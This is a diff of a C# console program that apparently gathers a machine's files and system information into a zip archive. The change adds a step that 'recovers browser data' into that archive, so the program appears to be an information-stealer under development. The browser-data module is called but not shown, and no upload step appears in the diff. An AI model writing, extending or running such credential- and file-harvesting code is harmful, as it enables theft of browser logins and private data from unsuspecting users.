@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.IO;
 using System.IO.Compression;
 using SystemInfoGrabber;
@@ -17,6 +17,17 @@ class Program
         bool filesOk = FileGrabber.GrabAllFiles(zipPath);
         Console.WriteLine(filesOk ? $"OK ({FileGrabber.TotalFilesCopied} files, {(FileGrabber.TotalBytesCopied / 1024.0 / 1024.0):F1} MB)" : "FAILED");
 
+        Console.Write("[*] Recovering browser data... ");
+        try
+        {
+            ConsoleApp1.BrowserRecovery.Execute(zipPath);
+            Console.WriteLine("OK");
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"FAILED: {ex.Message}");
+        }
+
         Console.Write("[*] Getting system info... ");
         string sysInfo = SystemInfo.GetAll();
         Console.WriteLine("OK");
@@ -24,7 +35,7 @@ class Program
         Console.Write("[*] Creating archive... ");
         try
         {
-            using (var zip = ZipFile.Open(zipPath, FileGrabber.TotalFilesCopied > 0 ? ZipArchiveMode.Update : ZipArchiveMode.Create))
+            using (var zip = ZipFile.Open(zipPath, FileGrabber.TotalFilesCopied > 0 || File.Exists(zipPath) ? ZipArchiveMode.Update : ZipArchiveMode.Create))
             {
                 var entry = zip.CreateEntry("system_info.txt");
                 using (var writer = new StreamWriter(entry.Open()))
